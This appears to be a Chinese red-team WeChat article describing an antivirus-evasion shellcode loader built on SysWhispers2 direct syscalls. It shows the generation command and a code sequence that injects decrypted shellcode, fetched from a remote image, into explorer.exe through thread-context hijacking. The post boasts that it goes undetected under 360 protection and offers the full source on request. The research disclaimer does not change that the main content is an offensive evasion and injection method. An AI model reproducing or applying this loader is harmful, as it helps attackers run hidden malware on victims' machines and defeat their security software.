#  站在巨人的肩膀上一种ShellLoder免杀方法-附POC

原创 L4ml3da  [ Lambda小队 ](javascript:void\(0\);)

**Lambda小队** ![]()

微信号 LambdaTeam

功能介绍 一群热爱网络安全的热血青年，一支做好事不留名的Lambda小队

____

___发表于_

收录于合集

#免杀研究 1 个

#工具分享 2 个

#

#

免责声明

  

  

本公众号致力于安全研究和红队攻防技术分享等内容，本文中所有涉及的内容均不针对任何厂商或个人，同时由于传播、利用本公众号所发布的技术或工具造成的任何直接或者间接的后果及损失，均由使用者本人承担。请遵守中华人民共和国相关法律法规，切勿利用本公众号发布的技术或工具从事违法犯罪活动。最后，文中提及的图文若无意间导致了侵权问题，请在公众号后台私信联系作者，进行删除操作。

 **0x0** **1**  
 **前言**

本次免杀的研究经历了某次hvv的实战后，决定放出源码供大家进行学习研究。

由于大部分杀软和安全设备是通过在用户模式API
函数中放置钩子，能够将程序中代码的执行流重定向到其引擎并检测可疑行为，然而ntdll.dll中调用系统函数的仅仅只有几个汇编指令，所以如果想规避到杀软检测，只需要自己实现汇编的系统调用即可。

本文是借鉴了著名的开源项目SysWhisper生成的汇编代码来进行免杀shellcode编写的。目前该项目已经升级到了第三个版本，本文中使用的是第二个版本。详情可以参考下面的github链接

https://github.com/jthuraisamy/SysWhispers2

         

 **0x0** **2**  
 **SysWhisper**

该工具的主要用途是用来生成系统调用文件，文件中包含了指定的绕过Hook的函数接口。

目前支持生成的函数接口有如下

  * NtCreateProcess (CreateProcess)

  * NtCreateThreadEx (CreateRemoteThread)

  * NtOpenProcess (OpenProcess)

  * NtOpenThread (OpenThread)

  * NtSuspendProcess

  * NtSuspendThread (SuspendThread)

  * NtResumeProcess

  * NtResumeThread (ResumeThread)

  * NtGetContextThread (GetThreadContext)

  * NtSetContextThread (SetThreadContext)

  * NtClose (CloseHandle)

  * NtReadVirtualMemory (ReadProcessMemory)

  * NtWriteVirtualMemory (WriteProcessMemory)

  * NtAllocateVirtualMemory (VirtualAllocEx)

  * NtProtectVirtualMemory (VirtualProtectEx)

  * NtFreeVirtualMemory (VirtualFreeEx)

  * NtQuerySystemInformation (GetSystemInfo)

  * NtQueryDirectoryFile

  * NtQueryInformationFile

  * NtQueryInformationProcess

  * NtQueryInformationThread

  * NtCreateSection (CreateFileMapping)

  * NtOpenSection

  * NtMapViewOfSection

  * NtUnmapViewOfSection

  * NtAdjustPrivilegesToken (AdjustTokenPrivileges)

  * NtDeviceIoControlFile (DeviceIoControl)

  * NtQueueApcThread (QueueUserAPC)

  * NtWaitForMultipleObjects (WaitForMultipleObjectsEx)

           

其中括号内的函数代表的是原始系统调用的函数接口名，也就是我们想绕过的函数接口。

           

下面将用本次实现的一个shellcode举例。

  * 

    
    
    python3 .\syswhispers.py -f NtOpenProcess,NtSuspendThread,NtGetContextThread,NtSetContextThread,NtResumeThread,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtProtectVirtualMemory --function-prefix Vegex -o syscalls

           

其中参数—function-prefix 即生成的函数接口名前缀，为了来混淆系统调用名，避免被杀软捕获指纹。-f
参数列出的就是所有需要绕过系统调用的函数接口名。

                  ![]()

           

![]()

           

其中的c文件是实现了系统调用的寻址方法，而asm的汇编代码中是寻址表，头文件即我们调用的所有函数接口声明。

  

![]()

![]()

#  

 **0x0** **3**  
 **ShellLoader  
**

#  

# 加密shellcode  

这次项目使用的是分离免杀的方法，至于分离免杀就不作过多赘述了。通过python制作一个携带shellcode的图片，同时将shellcode进行简单的移位加密处理。

![]()

          

本项目实现的shellcode是将远端图片拉取后，进行解密。

![]()

           

然后为了提高隐蔽性，代码中遍历了进程名，并且尝试将shellcode注入名为“explore.exe”的进程中，当然这样的操作存在一点的风险，可能导致目标进程崩溃，但是笔者目前测试下来多个系统未出现该问题，仅win10偶尔出现过一次。

![]()

           

最后便是本次免杀的主角，通过调用SysWhisper生成的接口进行shellcode加载。

           

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    首先打开进程NTSTATUS status = VegexOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);         申请内存VegexAllocateVirtualMemory(hProcess, &remoteAddr, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);         将shellcode写入内存中VegexWriteVirtualMemory(hProcess, remoteAddr, pp, sizeof(pp), NULL);         修改内存可执行VegexProtectVirtualMemory(hProcess, &remoteAddr, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);         创建远程线程HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);         暂停主线程VegexSuspendThread(hThread, &previousSuspendCount);         获取主线程上下文VegexGetContextThread(hThread, &ctx);修改 EIP 寄存器的值为 shellcode 的地址ctx.Rip = (DWORD)remoteAddr;         设置线程上下文VegexSetContextThread(hThread, &ctx);   恢复主线程VegexResumeThread(hThread, &previousSuspendCount);

           

具体编译方法参考github中的说明，这里不再赘述

![]()

开启360核晶后，本地测试，无任何反应，完美上线

           

![]()

           

同时通过Process Explorer进行进程查看，没有发现任何进程痕迹，例如上图注入的explorer.exe 的进程号是6344

下图中没有发现任何痕迹，隐蔽性非常高

![]()

           

         

 **0x0** **4**  
 **总结**  

文中的免杀方法较为简单，主要是依赖于SysWhisper的系统调用，未加入例如沙箱检测、关键字混淆等代码，主要是抛砖引玉，师傅们可以在本项目中进行修改添加跟多免杀功能，获得本项目下载地址，请在后台私信“免杀”即可。同时本项目仅供学习研究，请勿用于违法违规的测试或攻击。

  

  

 **加入我们一起学习**

  

  
  
  
  
  
  
  

  

本公众号是一群热爱网安事业的一线红队队员发起成立的，我们旨在分享最前沿的研究成果， **拒绝复制黏贴，打造最硬核的公众号**
，加入我们的交流群一起学习，里面有众多红队大佬、审计狗、SRC爱好者。群内同时为了更大程度上分享硬核内容，成立了知识星球，详情请关注下发二维码。

  

扫描下方二维码添加小助手拉你入群，若二维码失效，请私信后台有人拉你进群。

  

![]()

![]()

  

 **关于Lambda小队**

![]()  

Lambda小队经过多年的一线红队磨炼，取得了众多辉煌的战绩，同时也积淀了丰富的实战经验，后续将为大家带来更多一线的实战经历和研究成果。

  

![]()

  

![]()

![]()![]()

![]()![]()

  

![]()

![]()

  

![]()

  

![]()

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

